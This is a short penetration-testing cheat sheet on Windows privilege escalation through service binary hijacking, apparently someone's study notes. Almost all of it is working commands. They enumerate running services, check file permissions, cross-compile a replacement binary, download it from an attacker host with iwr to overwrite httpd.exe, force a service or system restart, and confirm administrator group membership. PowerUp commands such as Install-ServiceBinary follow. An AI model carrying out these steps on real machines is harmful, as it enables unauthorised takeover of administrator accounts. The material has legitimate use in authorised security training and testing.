# Leveraging Windows services

## Service Binary Hijacking

__REQUIRES__

 - A service running via a binary you have permissions over
 - Said service to be running as a more privileged user
 - Either SeShutdownPrivilege or permissions to restart the service

Find running services (This will not work in WinRM, use another protocol)
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Identify permissions over binary - (RX) not sufficient, (F) is ideal, (I) means inherited
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

cross-compile code (code in resources)
```bash
x86_64-w64-mingw32-gcc ausr.c -o ausr.exe
```

move to target machine
```powershell
iwr -uri http://$ip/ausr.exe -Outfile httpd.exe
```

restart service
```powershell
net stop httpd
net start httpd
```

if no permissions (SeShutdownPrivilege required)
```powershell
whoami /priv
shutdown /r /t 0
```

check work
```powershell
Get-LocalGroupMember administrators
```

## PowerUp (old)

import
```powershell
. .\PowerUp.ps1
```

Use
```powershell
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'mysql'
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal
```